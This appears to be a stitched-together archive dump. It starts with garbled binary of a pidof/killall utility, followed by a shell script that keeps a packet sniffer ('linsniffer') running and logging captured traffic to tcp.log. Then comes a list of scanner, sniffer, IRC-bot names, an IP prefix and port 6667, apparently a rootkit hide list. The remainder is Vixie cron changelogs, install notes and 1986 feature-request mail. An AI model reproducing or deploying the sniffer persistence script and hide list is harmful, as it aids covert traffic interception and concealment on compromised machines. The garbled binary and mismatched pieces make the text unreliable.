           PyuhBjv 19U  |x6PhhQ$hR      |QhSS          0|H|Re     PhhRZhQ  Ph&SS=( t<u8=$   P|Qh)h+  v t2j/Ptv 19]g  xf< uvu<|QUP>= tQUPv j|QUP  h6PhhHREPQj  xff9E{  D9En  =, t!P|RD  =x tc t,9wj hp  PhR~   	   v URPQ|n=$ t2P uPhUh   	ASv =lu	=, t>lPPP tPhdhC9]F9 thphMj6=0 u==x u=19u~-v rMPhhF9u=x t/9wj
hp\v  
MI   P	9 th=4 t^19~Aj P}%=lu6Fj uh[^_]6Uhhhhhhhh hBh]v Uhlhhhhhhh hhhhphhahhR hHh@hth1hh"hh]v U=x t#jUWVSj/uPt@v u   1t
VO)x}uzuF    utp#  1  }uFuF    u-=x tPhh.1  v    }w  uF8-a  Mu8-C  C; 7  Ph,      $ ,Hd(   l=x tB,   R6=x t&0   66=x t
$   6=x t4   C; ; t3u@9u	=x t
v hu@P;  }}}!vj h2hjKv /EPEHPWye[^_]UWVS18=<    v ~0Pv09wj
hp6 
1FPtRh~0M~ w9wj
hp 
e[^_]UWVSu}hDPtj j
j VOv 8=< t&6VCPt	{ u{ tWVhhje[^_]S@=@t;u[6        [  r /dev/hdap   
 Kill %s(%d) ? (y/n)  malloc /proc realloc %s/%d/stat %*d (%[^)] %s/%d/cmdline %s skipping partial match %s(%d)
 %s/%d/exe %d Killed %s(%d)
 %s(%d): %s
 /proc is empty (not mounted ?)
 %s: no process killed
 usage: pidof [ -e ] name ...
        pidof -V

     -e      require exact match for very long names;
             skip if the command line is unavailable
     -V      display version information

 usage: killall [ -eiqvw ] [ -signal ] name ...
        killall -l
        killall -V

     -i      ask for confirmation before killing
     -l      list all known signal names
     -q      quiet; don't print complaints
     -signal send signal instead of SIGTERM
     -v      report if the signal was successfully sent
     -V      display version information
     -w      wait for processes to die

 killall -l -V pidof %s from psmisc version 17
 eiqvw Maximum number of names is %d
 UNUSED PWR IO WINCH PROF VTALRM XFSZ XCPU URG TTOU TTIN TSTP STOP CONT CHLD STKFLT TERM ALRM PIPE USR2 SEGV USR1 KILL FPE BUS IOT ABRT TRAP ILL QUIT INT HUP    %s%s %s: unknown signal; %s -l lists signals.
                                                    	   
                                          {   v   q   j   e   _   \   X   Q                        .>N^n~.>N^n~         p            P
                     P              d   4   0                           01.01             01.01             01.01             01.01    GCC: (GNU) 2.7.2.l.2  GCC: (GNU) 2.7.2  GCC: (GNU) 2.7.2  GCC: (GNU) 2.7.2.l.2  .symtab .strtab .shstrtab .interp .hash .dynsym .dynstr .rel.bss .rel.plt .init .plt .text .fini .rodata .data .ctors .dtors .got .dynamic .bss .note .comment                                                                       #            h               )         PP  0              1                            9   	      44  0               B   	      dd                K         pp                    Q         xx                   V         
                   \                             b           X                 j                               p         @@                     w         HH                     ~         PP                                                         hh!                                 h!  P                                !  P                                "                    #!/bin/sh

# checks if your sniffer is running..

# directory your sniffer is in
dname="/home/j/joseph"

# name of your sniffer
sname="linsniffer"

# file that your normally save your sniff-logs to
lname="tcp.log"

if 
pidof -s $sname >/dev/null
then
echo "Sniffer running."
else
echo "Restarting sniffer..."
${dname}/${sname} >> $lname &
echo "done."
exit
fi3 datapipe
3 mscan
3 sniffer
3 lsppp.txt
1 208.254
3 6232
4 6667
eggdrop1.1.5
datapipe
mscan
linsniffer
tcp.log
sniff.pid
Vixie Cron		Changes from V2 to V3
Paul Vixie
29-Dec-1993

The crontab command now conforms to POSIX 1003.2.  This means that when you
install it, if you have any "crontab" command lines floating around in shell
scripts (such as /etc/rc or /etc/rc.local), you will need to change them.

I have integrated several changes made by BSDi for their BSD/386 operating
system; these were offerred to me before I started consulting for them, so
it is safe to say that they were intended for publication.  Most notably,
the name of the cron daemon has changed from "crond" to "cron".  This was
done for compatibility with 4.3BSD.  Another change made for the same reason
is the ability to read in an /etc/crontab file which has an extra field in
each entry, between the time fields and the command.  This field is a user
name, and it permits the /etc/crontab command to contain commands which are
to be run by any user on the system.  /etc/crontab is not "installed" via
the crontab(1) command; it is automatically read at startup time and it will
be reread whenever it changes.

I also added a "-e" option to crontab(1).  Nine people also sent me diffs
to add this option, but I had already implemented it on my own.  I actually
released an interrim version (V2.2, I think) for limited testing, and got a
chance to fix a bad security bug in the "-e" option thanks to XXX.

The daemon used to be extraordinarily sloppy in its use of file descriptors.
A heck of a lot of them were left open in spawned jobs, which caused problems
for the daemon and also caused problems with the spawned jobs if they were 
shell scripts since "sh" and "csh" have traditionally used hidden file
descriptors to pass information to subshells, and cron was causing them to
think they were subshells.  If you had trouble with "sh" or "csh" scripts in
V2, chances are good that V3 will fix your problems.

About a dozen people have reminded me that I forgot to initialize
"crontab_fd" in database.c.  Keith Cantrell was the first, so he gets the
point.

Steve Simmons reminded me that once an account has been deleted from the
system, "crontab -u USER -d" will not work.  My solution is to suggest to
all of you that before you delete a user's account, you first delete that
user's crontab file if any.  From cron's point of view, usernames can never
be treated as arbitrary strings.  Either they are valid user names, or they
are not.  I will not make an exception for the "-d" case, for security
reasons that I consider reasonable.  It is trivial for a root user to delete
the entry by hand if necessary.

Dan O'Neil reminded me that I forgot to reset "log_fd" in misc.c.  A lot of
others also reminded me of this, but Dan gets the point.  I didn't fix it
there, since the real bug was that it should have been open in the parent.

Peter Kabal reminded me that I forgot to "#ifdef DEBUGGING" some code in
misc.c.  Hans Trompert actually told me first, but Peter sent the patch so
he gets the point.

Russell Nelson told me that I'd forgotten to "#include <syslog.h>" in misc.c,
which explains why a lot of other people complained that it wasn't using
syslog even when they configured it that way :-).  Steve Simmons told me
first, though, so he gets the point.

An interrim version of the daemon tried to "stat" every file before
executing it; this turned out to be a horribly bad idea since finding the
name of a file from a shell command is a hard job (that's why we have
shells, right?)  I removed this bogus code.  Dave Burgess gets the point.

Dennis R. Conley sent a suggestion for MMDF systems, which I've added to the
comments in cron.h.

Mike Heisler noted that I use comments in the CONVERSION file which are
documented as illegal in the man pages.  Thanks, Mike.

Irving Wolfe sent me some very cheerful changes for a NeXT system, but I
consider the system itself broken and I can't bring myself to #ifdef for
something as screwed up as this system seems to be.  However, various others
did send me smaller patches which appear to have cause cron to build and run
correctly on (the latest) NeXT machines, with or without the "-posix" CFLAG.
Irving also asked for a per-job MAILTO, and this was finally added later when
I integrated the BSD/386 changes contributed by BSDi, and generalized some of
the parsing.

Lots of folks complained that the autogenerated "Date:" header wasn't in
ARPA format.  I didn't understand this -- either folks will use Sendmail and
not generate a Date:  at all (since Sendmail will do it), or folks will use
something other than Sendmail which won't care about Date: formats.  But
I've "fixed" it anyway...

Several people suggested that "*" should be able to take a "/step".  One person
suggested that "N/step" ought to mean "N-last/step", but that's stretching things
a bit far.  "*/step" seems quite intuitive to me, so I've added it.  Colin Plumb
sent in the first and most polite request for this feature.

As with every release of Cron, BIND, and seemingly everything else I do, one
user stands out with the most critical but also the most useful analysis.
Cron V3's high score belongs to Peter Holzer, who sent in the nicest looking
patch for the "%" interpretation problem and also helped me understand a
tricky bit of badness in the "log_fd" problem.

agulbra@flode.nvg.unit.no wins the honors for being the first to point out the
nasty security hole in "crontab -r".  'Nuff said.

Several folks pointed out that log_it() needed to exist even if logging was
disabled.  Some day I will create a tool that will compile a subsystem with
every possible combination and permutation of #ifdef options, but meanwhile
thanks to everybody.

job_runqueue() was using storage after freeing it, since Jordan told me back
in 1983 that C let you do that, and I believed him in 1986 when I wrote all
this junk.  Linux was the first to die from this error, and the Linux people
sent me the most amazing, um, collection of patches for this problem.  Thanks
for all the fish.

Jeremy Bettis reminded me that popen() isn't safe.  I grabbed Ken Arnold's 
version of popen/pclose from the ftpd and hacked it to taste.  We're safe now,
from this at least.

Branko Lankester sent me a very timely and helpful fix for a looming security
problem in my "crontab -e" implementation.

--------

Vixie Cron		Changes from V1 to V2
Paul Vixie
8-Feb-1988

Many changes were made in a rash of activity about six months ago, the exact
list of which is no longer clear in my memory.  I know that V1 used a file
called POKECRON in /usr/spool/cron to tell it that it was time to re-read
all the crontab files; V2 uses the modtime the crontab directory as a flag to
check out the crontab files; those whose modtime has changed will be re-read,
and the others left alone.  Note that the crontab(1) command will do a utimes
call to make sure the mtime of the dir changes, since the filename/inode will
often remain the same after a replacement and the mtime wouldn't change in
that case.

8-Feb-88: made it possible to use much larger environment variable strings.
	V1 allowed 100 characters; V2 allows 1000.  This was needed for PATH
	variables on some systems.  Thanks to Toerless Eckert for this idea.
	E-mail: UUCP: ...pyramid!fauern!faui10!eckert

16-Feb-88: added allow/deny, moved /usr/spool/cron/crontabs to
	/usr/lib/cron/tabs.  allow and deny are /usr/lib/cron/{allow,deny},
	since the sysv naming for this depends on 'at' using the same
	dir, which would be stupid (hint: use /usr/{lib,spool}/at).

22-Feb-88: made it read the spool directory for crontabs and look each one
	up using getpwnam() rather than reading all passwds with getpwent()
	and trying to open each crontab.

9-Dec-88: made it sync to :00 after the minute, makes cron predictable.
	added logging to /var/cron/log.

14-Apr-90: (actually, changes since December 1989)
	fixed a number of bugs reported from the net and from John Gilmore.
	added syslog per Keith Bostic.  security features including not
	being willing to run a command owned or writable by other than
	the owner of the crontab 9not working well yet)
$Id: CONVERSION,v 2.2 1993/12/28 08:34:43 vixie Exp $

Conversion of BSD 4.[23] crontab files:

Edit your current crontab (/usr/lib/crontab) into little pieces, with each
users' commands in a different file.  This is different on 4.2 and 4.3,
but I'll get to that below.  The biggest feature of this cron is that you
can move 'news' and 'uucp' cron commands into files owned and maintainable
by those two users.  You also get to rip all the fancy 'su' footwork out
of the cron commands.  On 4.3, there's no need for the 'su' stuff since the
user name appears on each command -- but I'd still rather have separate
crontabs with seperate environments and so on.

Leave the original /usr/lib/crontab!  This cron doesn't use it, so you may
as well keep it around for a while in case something goes wakko with this
fancy version.

Most commands in most crontabs are run by root, have to run by root, and
should continue to be run by root.  They still have to be in their own file;
I recommend /etc/crontab.src or /usr/adm/crontab.src.

'uucp's commands need their own file; how about /usr/lib/uucp/crontab.src?
'news' also, perhaps in /usr/lib/news/crontab.src...

I say `how about' and `perhaps' because it really doesn't matter to anyone
(except you) where you put the crontab source files.  The `crontab' command
COPIES them into a protected directory (CRONDIR/SPOOL_DIR in cron.h), named
after the user whose crontab it is.  If you want to examine, replace, or
delete a crontab, the `crontab' command does all of those things.  The
various `crontab.src' (my suggested name for them) files are just source
files---they have to be copied to SPOOLDIR using `crontab' before they'll be
executed.

On 4.2, your crontab might have a few lines like this:

	5 * * * *   su uucp < /usr/lib/uucp/uudemon.hr
	10 4 * * *  su uucp < /usr/lib/uucp/uudemon.day
	15 5 * * 0  su uucp < /usr/lib/uucp/uudemon.wk

...or like this:

	5 * * * *   echo /usr/lib/uucp/uudemon.hr | su uucp
	10 4 * * *  echo /usr/lib/uucp/uudemon.day | su uucp
	15 5 * * 0  echo /usr/lib/uucp/uudemon.wk | su uucp

On 4.3, they'd look a little bit better, but not much:

	5 * * * *   uucp  /usr/lib/uucp/uudemon.hr
	10 4 * * *  uucp  /usr/lib/uucp/uudemon.day
	15 5 * * 0  uucp  /usr/lib/uucp/uudemon.wk

For this cron, you'd create /usr/lib/uucp/crontab.src (or wherever you want
to keep uucp's commands) which would look like this:

	# /usr/lib/uucp/crontab.src - uucp's crontab
	#
	PATH=/usr/lib/uucp:/bin:/usr/bin
	SHELL=/bin/sh
	HOME=/usr/lib/uucp
	#
	5 * * * *   uudemon.hr
	10 4 * * *  uudemon.day
	15 5 * * 0  uudemon.wk

The application to the `news' cron commands (if any) is left for you to
figure out.  Likewise if there are any other cruddy-looking 'su' commands in
your crontab commands, you don't need them anymore: just find a good place
to put the `crontab.src' (or whatever you want to call it) file for that
user, put the cron commands into it, and install it using the `crontab'
command (probably with "-u USERNAME", but see the man page).

If you run a 4.2-derived cron, you could of course just install your current
crontab in toto as root's crontab.  It would work exactly the way your
current one does, barring the extra steps in installing or changing it.
There would still be advantages to this cron, mostly that you get mail if
there is any output from your cron commands.

One note about getting mail from cron: you will probably find, after you
install this version of cron, that your cron commands are generating a lot
of irritating output.  The work-around for this is to redirect all EXPECTED
output to a per-execution log file, which you can examine if you want to
see the output from the "last time" a command was executed; if you get any
UNEXPECTED output, it will be mailed to you.  This takes a while to get
right, but it's amazingly convenient.  Trust me.

$Id: FEATURES,v 2.1 1993/12/28 08:34:43 vixie Exp $

Features of Vixie's cron relative to BSD 4.[23] and SysV crons:

--	Environment variables can be set in each crontab.  SHELL, USER,
	LOGNAME, and HOME are set from the user's passwd entry; all except
	USER can be changed in the crontab.  PATH is especially useful to
	set there.  TZ can be set, but cron ignores it other than passing
	it on through to the commands it runs.  Format is

		variable=value

	Blanks surrounding the '=' will be eaten; other blanks in value are
	okay.  Leading or trailing blanks can be preserved by quoting, single
	or double quotes are okay, just so they match.

		PATH=.:/bin:/usr/bin
		SHELL=/bin/sh
		FOOBAR = this is a long blanky example

	Above, FOOBAR would get "this is a long blanky example" as its value.

	SHELL and HOME will be used when it's time to run a command; if
	you don't set them, HOME defaults to your /etc/passwd entry
	and SHELL defaults to /bin/sh.

	MAILTO, if set to the login name of a user on your system, will be the
	person that cron mails the output of commands in that crontab.  This is
	useful if you decide on BINMAIL when configuring cron.h, since binmail
	doesn't know anything about aliasing.

--	Weekdays can be specified by name.  Case is not significant, but only
	the first three letters should be specified.

--	Months can likewise be specified by name.  Three letters only.

--	Ranges and lists can be mixed.  Standard crons won't allow '1,3-5'.

--	Ranges can specify 'step' values.  '10-16/2' is like '10,12,14,16'.

--	Sunday is both day 0 and day 7 -- apparently BSD and ATT disagree
	about this.

--	Each user gets their own crontab file.  This is a win over BSD 4.2,
	where only root has one, and over BSD 4.3, where they made the crontab
	format incompatible and although the commands can be run by non-root
	uid's, root is still the only one who can edit the crontab file.  This
	feature mimics the SysV cron.

--	The 'crontab' command is loosely compatible with SysV, but has more
	options which just generally make more sense.  Running crontab with
	no arguments will print a cute little summary of the command syntax.

--	Comments and blank lines are allowed in the crontab file.  Comments
	must be on a line by themselves; leading whitespace is ignored, and
	a '#' introduces the comment.

--	(big win) If the `crontab' command changes anything in any crontab,
	the 'cron' daemon will reload all the tables before running the
	next iteration.  In some crons, you have to kill and restart the
	daemon whenever you change a crontab.  In other crons, the crontab
	file is reread and reparsed every minute even if it didn't change.

--	In order to support the automatic reload, the crontab files are not
	readable or writable except by 'crontab' or 'cron'.  This is not a
	problem, since 'crontab' will let you do pretty much whatever you
	want to your own crontab, or if you are root, to anybody's crontab.

--	If any output is generated by a command (on stdout OR stderr), it will
	be mailed to the owner of the crontab that contained the command (or
	MAILTO, see discussion of environment variables, above).  The headers
	of the mail message will include the command that was run, and a
	complete list of the environment that was passed to it, which will
	contain (at least) the USER (LOGNAME on SysV), HOME, and SHELL.

--	the dom/dow situation is odd.  '* * 1,15 * Sun' will run on the
	first and fifteenth AND every Sunday;  '* * * * Sun' will run *only*
	on Sundays;  '* * 1,15 * *' will run *only* the 1st and 15th.  this
	is why we keep 'e->dow_star' and 'e->dom_star'.  I didn't think up
	this behaviour; it's how cron has always worked but the documentation
	hasn't been very clear.  I have been told that some AT&T crons do not
	act this way and do the more reasonable thing, which is (IMHO) to "or"
	the various field-matches together.  In that sense this cron may not
	be completely similar to some AT&T crons.
/* Copyright 1993,1994 by Paul Vixie
 * All rights reserved
 *
 * Distribute freely, except: don't remove my name from the source or
 * documentation (don't take credit for my work), mark your changes (don't
 * get me blamed for your possible bugs), don't alter or remove this
 * notice.  May be sold if buildable source is provided to buyer.  No
 * warrantee of any kind, express or implied, is included with this
 * software; use at your own risk, responsibility for damages (if any) to
 * anyone resulting from the use of this software rests entirely with the
 * user.
 *
 * Send bug reports, bug fixes, enhancements, requests, flames, etc., and
 * I'll try to keep a version up to date.  I can be reached as follows:
 * Paul Vixie          <paul@vix.com>          uunet!decwrl!vixie!paul
 */

$Id: INSTALL,v 2.5 1994/01/15 20:43:43 vixie Exp $

Read the comments at the top of the Makefile, then edit the area marked
'configurable stuff'.

Edit config.h.  The stuff I expect you to change is down a bit from the
top of the file, but it's clearly marked.  Also look at pathnames.h.

You don't have to create the /var/cron or /var/cron/tabs directories, since
both the daemon and the `crontab' program will do this the first time they
run if they don't exist.  You do need to have a /var, though -- just "mkdir
/var" if you don't have one, or you can "mkdir /usr/var; ln -s /usr/var /var"
if you expect your /var to have a lot of stuff in it.

You will also need /usr/local/etc and /usr/local/bin directories unless you
change the Makefile.  These will have to be created by hand, but if you are
a long-time Usenet user you probably have them already.  /usr/local/man is
where I keep my man pages, but I have the source for `man' and you probably
do not.  Therefore you may have to put the man pages into /usr/man/manl,
which will be hard since there will be name collisions.  (Note that the man
command was originally written by Bill Joy before he left Berkeley, and it
contains no AT&T code, so it is in UUNET's archive of freely-distributable
BSD code.)

LINUX note: /usr/include/paths.h on some linux systems shows _PATH_SENDMAIL
	to be /usr/bin/sendmail even though sendmail is installed in /usr/lib.
	you should check this out.

say:
	make all

su and say:
	make install

Note that if I can get you to "su and say" something just by asking, you have
a very serious security problem on your system and you should look into it.

Edit your /usr/lib/crontab file into little pieces -- see the CONVERSION file
for help on this.

Use the `crontab' command to install all the little pieces you just created.
Some examples (see below before trying any of these!)

	crontab -u uucp -r /usr/lib/uucp/crontab.src
	crontab -u news -r /usr/lib/news/crontab.src
	crontab -u root -r /usr/adm/crontab.src

Notes on above examples: (1) the .src files are copied at the time the
command is issued; changing the source files later will have no effect until
they are reinstalled with another `crontab -r' command.  (2) The crontab
command will affect the crontab of the person using the command unless `-u
USER' is given; `-u' only works for root.  When using most `su' commands
under most BSD's, `crontab' will still think of you as yourself even though
you may think of yourself as root -- so use `-u' liberally.  (3) the `-r'
option stands for `replace'; check the man page for crontab(1) for other
possibilities.

Kill your existing cron daemon -- do `ps aux' and look for /etc/cron.

Edit your /etc/rc or /etc/rc.local, looking for the line that starts up
/etc/cron.  Comment it out and add a line to start the new cron daemon
-- usually /usr/local/etc/cron, unless you changed it in the Makefile.

Start up this cron daemon yourself as root.  Just type /usr/local/etc/cron
(or whatever); no '&' is needed since the daemon forks itself and the
process you executed returns immediately.

ATT notes: for those people unfortunate enough to be stuck on a AT&T UNIX,
you will need the public-domain "libndir", found in the B News source and in
any comp.sources.unix archive.  You will also need to hack the code some.
[ this is really old mail that came to me in response to my 1986 posting
  to usenet asking for feature suggestions before releasing the first 
  version of cron.  it is presented here for its entertainment value.
  --vix ]

$Id: MAIL,v 1.1 1993/12/28 08:30:36 vixie Exp $

From ptsfa!lll-crg!ames!acornrc!bob Wed Dec 31 10:07:08 1986
Date: Wed, 31 Dec 86 08:59:31 pst
From: lll-crg!ames!acornrc!bob (Bob Weissman)
To: ptsfa!vixie!paul
Status: RO

Sure, here's a suggestion: I'd like to be able to run a program, say,
every two hours.  Current cron requires me to write
0,2,4,6,8,10,12,14,16,18,20,22 in the hours field.  How about a notation
to handle this more elegantly?

<<	Okay, I've allowed 0-22/2 as a means of handling this.
	The time specification for my cron is as follows:
		specification = range {"," range}
		range = (start "-" finish ["/" step]) | single-unit
	This allows "1,3,5-7", which the current cron doesn't (it won't
	do a range inside a list), and handles your specific need.	>>

From drw@mit-eddie Wed Dec 31 18:25:27 1986
Date: Wed, 31 Dec 86 14:28:19 est
From: drw@mit-eddie (Dale Worley)
To: mit-eddie!vixie!paul
Status: RO

We have a lot of lines in our crontab of the form

	00 12 * * * su user < /usr/users/user/script.file

This barfs (silently!) on our system (Dec Ultrix 1.2 == 4.2bsd) if
user's shell is csh.  This, I am told, is because csh requires that
the environment be set up in certain ways, which cron doesn't do.
(Actually, I believe, it is because /etc/rc, which runs cron, doesn't
set up the environment enough for csh to run, and cron just inherits
the situation.)  Anyway, the point is that if you find out what csh
really needs in its environment, you might want to set up cron to
provide some reasonable defaults (if it isn't supplied by cron's
parent).  Also, could you tell me what csh needs, if you find out, so
we can hack our /etc/rc?

<<	well, the environment IS a problem. processes that cron forks
	will inherit the environment of the person who ran the cron
	daemon... I plan to edit out such useless things as TERMCAP,
	TERM, and the like; supply correct values for HOME, USER, CWD,
	and whatever else comes to mind.  I'll make sure csh works...	>>
From ptsfa!ames!seismo!dgis!generous Thu Jan  1 07:33:17 1987
Date: Thu Jan 1 10:29:20 1987
From: ames!seismo!dgis!generous (Curtis Generous)
To: nike!ptsfa!vixie!paul
Status: RO

Paul:

One of the limitations of the present versions of cron is the lack
of the capability of specifying a way to execute a command every
n units of time.

Here is a good example:

# Present method to start up uucico
02,12,22,32,42,52 * * * * 	exec /usr/lib/uucp/uucico -r1

# New method ?? (the ':' here is just one possibility for syntax)
02:10 * * * *			exec /usr/lib/uucp/uucico -r1

This method would prove very helpful for those programs that get started
every few minutes, making the entry long and not easily readable.  The first
number would specify the base time, and the second number the repetition
interval.

<<	Good idea, but bob@acornrc beat you to it.  I used '/' instead of
	':'.  This is my personal preference, and seems intuitive when you
	think of the divide operator in C... Does anyone have a preference? >>

From ptsfa!lll-lcc!seismo!decuac!c3pe!c3engr!charles Thu Jan  1 17:04:24 1987
From: lll-lcc!seismo!c3pe!c3engr!charles (Charles Green)
To: c3pe!decuac!dolqci!vrdxhq!seismo!lll-lcc!ptsfa!vixie!paul
Date: Thu Jan  1 19:22:47 1987
Status: RO

Well, this isn't a compatible extension, but I have in times past wondered
about a facility to let you start a process at intervals of, say, 17 minutes,
instead of particular minutes out of each hour.

<<	This was a popular request!	>>

From seismo!uwvax!astroatc!nicmad!norvax!mann Sun Jan  4 13:04:01 1987
Date: Fri, 2 Jan 87 09:23:53 cst
From: lll-lcc!seismo!uwvax!astroatc!nicmad!norvax!mann (Tom Mann)
To: ptsfa!vixie!paul
Status: RO

I'm not sure if it is in cron (either SysV or BSD ... if it is, I haven't
figured it out ) but a comment feature would SURE BE NICE!.
There are times when I want to comment out an entry
for a period of time; it might also make it a lot more legible.

<<	My cron allows blank lines and standard #-type comments.  I know
	that one BSD4.2 cron I've used had it.  I don't know about SysV.  >>

From ptsfa!hoptoad!hugh Mon Jan  5 10:26:46 1987
Date: Mon, 5 Jan 87 01:22:17 PST
From: hoptoad!hugh (Hugh Daniel)
To: ptsfa!vixie!paul
Status: RO

  Hi, I do have a BIG one that I would like.  I want to log ALL output
from command lines into a file for each line.  Thus I might have a chance
of finding out why my crontab entry did not work.
  This would seem to work best if done by cron, as it is now I have a google
of shell scripts laying about just to put the error output where I can see
it.

<<	My cron (and the SysV cron) will send mail to the owner of the
	particular crontab file if a command generates any output on stdout
	or stderr.  This can be irritating, but if you write a script such
	that any output means a problem occurred, you can avoid most logfile
	needs, and not generate mail except in unforeseen circumstances.   >>

From ptsfa!dual!ucbvax!ihnp4!anvil!es!Robert_Toxen Mon Jan  5 13:08:46 1987
From: dual!ucbvax!ihnp4!anvil!es!Robert_Toxen
Date: Fri,  2 Jan 87 14:25:29 EST
To: anvil!ihnp4!ucbvax!dual!ptsfa!vixie!paul
Status: RO

Here are some suggestions:
1. Run it through the C preprocessor via "/lib/<whatever>".

<<	hmmm. this seems of limited utility, and if you really wanted
	to do it that way, you could do it yourself (since users can
	write to their own crontab files).  I'll add '-' (read stdin)
	to the crontab installer program to facilitate this.		>>

2. Allow specifying every Nth day of week, i.e., every second Wednesday.
   I did this to calendar by separating the day of week (Wed=4, which one
   to start on and N with slashes).  I took modulo the day of year as a
   starting point so that someone with a desk calendar documenting such
   things can easily determine the offset (second number).  I did this
   while at SGI; alas I don't have a copy of the code.

<<	I can see how this could be useful, but I'm not sure how I'd
	implement it.  Cron currently doesn't keep track of the last time
	a given command was run; whether the current Wednesday is the first
	or second since the command was last run would be pretty hard to
	figure out.  I'd have to keep a database of commands and their
	execution around, and purge it when the crontab was overwritten.
	This is too much work for me, but if someone adds it, let me know.  >>

From ptsfa!ames!seismo!cbmvax!devon!paul Tue Jan  6 05:50:17 1987
From: ames!seismo!cbmvax!devon!paul
To: cbmvax!seismo!nike!ptsfa!vixie!paul
Date: Mon Jan  5 09:29:57 1987
Status: RO

One problem that has always plagued me with cron is the assumed ORing.
I'd like to see some type of ANDing implemented.  I guess I can best
describe this by example.  Say I have the following line in my crontab
file:

*  *  4-31  *  1-6	/usr/bin/command

What this does is run 'command' on the 4th thru 31st days of the
month, AND on Monday thru Saturday; which probably means running it
every day of the month (unless Sunday falls on days 1-3).  This
happens because cron runs the command if the day-of-month OR the
day-of-week is true.

What I'd like to happen with the above line is to run the command ONLY
on Monday thru Saturday any time after the 3rd of the month, e.g. if
the day-of-month AND the day-of-week are true.

My proposal to you is to implement some special chars for the first
five fields.  Examples:

*  *  !1-3  *  1-6	/usr/bin/command

(run command Mon-Sat, but NOT [!] on the first 3 days of the month)

*  *  &4-31 *  &1-6	/usr/bin/command

(run command if day-of-month AND day-of-week are true)

Get the picture?  This would be compatable with existing versions of
cron (which wouldn't currently be using any special characters, so
that old crontabs would be handled correctly).

<<	This message made me aware of the actual boolean expression involved
	in a crontab entry.  I'd assumed that it was
		(minute && hour && DoM && month && DoW)
	But it's really
		(minute && hour && month && (DoM || DoW))

	I can see some value in changing this, but with a fixed order of
	fields, operators get to be kindof unary, which && and || really
	aren't.  If someone has an idea on a syntax that allows useful
	variations to the standard (&& && && (||)) default, please suggest. >>

From bobkat!pedz Tue Jan  6 20:02:10 1987
From: pedz@bobkat.UUCP (Pedz Thing)
Date: 2 Jan 87 17:34:44 GMT
Status: RO

Log files!  It would be nice to be able to specify a log for cron
itself and also a log for each program's stdout and stderr to go to.
The latter can of course be done with > and 2> but it would be nice if
there could be a single line with some sort of pattern like
`> /usr/spool/log/%' and the command would be substituted for the %.
Another thing which would be nice is to be able to specify which shell
to call to give the command to.

<<	Log files are done with mail.  The '%' idea could be useful if
	a different character were used (% is special to cron, see man
	page); a different directory would have to be chosen, since each
	user has their own crontab file; and something intelligent would
	have to be done in the file naming, since the first word of the
	command might be ambiguous (with other commands).  In short, it's
	too much work.  Sorry.						  >>

From guy%gorodish@sun Tue Jan  6 20:03:13 1987
From: guy%gorodish@sun (Guy Harris)
Message-ID: <10944@sun.uucp>
Date: 5 Jan 87 12:09:09 GMT
References: <429@vixie.UUCP> <359@bobkat.UUCP>
Sender: news@sun.uucp
Status: RO

> Another thing which would be nice is to be able to specify which shell
> to call to give the command to.

Well, the obvious choice would be the user's shell, but this wouldn't work
for accounts like "uucico".

<<	I use the owning user's shell, and to handle "uucico" I check a
	list of "acceptable shells" (currently compiled in, does anybody
	mind?), substituting a default (compiled in) shell if the user's
	shell isn't on the list.

	BTW, "compiled in" means that it's in a .h file, easily changed
	during installation, but requiring recompilation to modify.  You
	don't have to go digging through the code to find it...		  >>

From qantel!hplabs!ucbvax!mwm@violet.berkeley.edu Tue Jan  6 21:24:48 1987
To: hplabs!qantel!vixie!paul (Paul Vixie Esq)
Date: 04 Jan 87 00:42:35 PST (Sun)
From: Mike Meyer <mwm@violet.berkeley.edu>
Status: RO

<<[Discussion of RMS/FSF, and mwm's GNU Cron deleted]>>

Oh, yeah - here are the extensions on my cron:

1) Sunday is both day 0 and day 7, so it complies with both SysV and
BSD cron.

<<	Good idea. I did it too, thanks for informing me.	>>

2) At is integrated into the cron. Instead of atrun to scan the
/usr/spool/at directory, at files are put into the /usr/lib/cron
directory along with users cron files, and cron fabricates a line from
a crontab file to run them. This is considered a major win by all who
use it.

<<	I don't use 'at', and my cron doesn't do anything with it.  To run
	'at', I use 'atrun' the same way the current BSD cron does.  My
	crontab files are in /usr/spool/cron/crontabs, in the SysV
	tradition -- not in /usr/lib/cron.  This is a configuration
	parameter, of course.						>>

There are two known restrictions:

1) I don't support any of the SysV security hooks. I don't have a use
for them, and RMS didn't like the idea at all :-).

<<	This means cron.allow and cron.deny.  I plan to support them, as
	they've been quite helpful at various HPUX sites I've administered. >>

2) Cron expects to be able to create files with names longer than 14
characters, which makes it hard to run on SysV. At least one person
was working on a port, but I don't know how it's going. That might
make for a good reason for releasing yours, right there.

<<	If someone has SysV (with the 14-character limit), they probably
	won't want my cron, since it doesn't add much to the standard
	version (which they may have support for).  My cron is not currently
	portable to non-BSD systems, since it relies on interval timers (I
	needed to sleep for intervals more granular than seconds alone would
	allow).  The port would be trivial, and I will do it if a lot of
	people ask for it...						>>

Oh, yeah - I'm going to see about getting this cron integrated into
the next 4BSD release.

<<	How does one go about this?  I have a few nifty gadgets I'd like
	to contribute, this cron being one of them...			>>

<<[more FSF/GNU discussion deleted]>>

From qantel!hplabs!ames!ut-sally!ut-ngp!melpad!bigtex!james Tue Jan  6 21:24:57 1987
Posted-Date: Fri, 2 Jan 87 19:26:16 est
Date: Fri, 2 Jan 87 19:26:16 est
From: hplabs!ames!ut-sally!ut-ngp!bigtex!james
To: vixie!paul
Status: RO

Yes!!!  There are several critical failures in System V cron...

1. Pass all variables in cron's environment into the environment of things
   cron starts up, or at least into the crontab entries started up (at jobs
   will inherit the environment of the user).  If nothing else it is critically
   important that the TZ variable be passed on.  PATH should be passed on too.
   Basically, passing environment values allows one to design a standard
   environment with TZ and PATH and have that run by everything.  If anyone
   tells you this is no big deal, consider what happens when uucico is
   started by cron in CA to make a long distance phone link...  Unless the
   administrator is really on his/her toes, calls scheduled at 5pm will really
   go at two in the afternoon, needlessly incurring huge phone bills, all
   because System V refuses to pass the TZ from its environment down.  There
   are work arounds, but only putting it in cron will really work.  This is
   not a security hole.

<<	delete TERM and TERMCAP; modify HOME, USER, and CWD; pass TZ and
	PATH through undisturbed.  any other requests out there?

	BSD doesn't have this problem -- TZ is passed right on through if
	you define it in the shell before starting my cron daemon.  However,
	the BSD I'm running this on doesn't need TZ to be defined anyway...
	The default in the kernel has been just fine so far...  But just the
	same, if/when I port to SysV (I guess I really should), I'll make
	sure this works right.

	I guess I've been spoiled.  HPUX is SysV-based, and I never had a
	problem with cron and TZ when I used it.			  >>

2. A way to avoid logging stuff in /usr/lib/cron/log.  I have a cron entry
